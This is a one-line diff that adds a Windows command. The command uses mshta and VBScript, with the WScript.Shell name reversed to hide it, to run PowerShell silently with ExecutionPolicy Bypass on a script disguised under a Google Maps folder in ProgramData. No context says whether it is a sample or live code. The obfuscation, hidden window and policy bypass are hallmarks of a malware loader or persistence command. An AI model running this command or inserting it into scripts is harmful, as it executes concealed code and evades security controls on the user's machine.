@@ -1,0 +1,1 @@
+mshta vbscript:Execute("CreateObject(StrReverse(""llehS.tpircSW"")).Run ""powershell -ExecutionPolicy Bypass & 'C:\ProgramData\Google\Maps\Maps.ps1'"", 0:close")
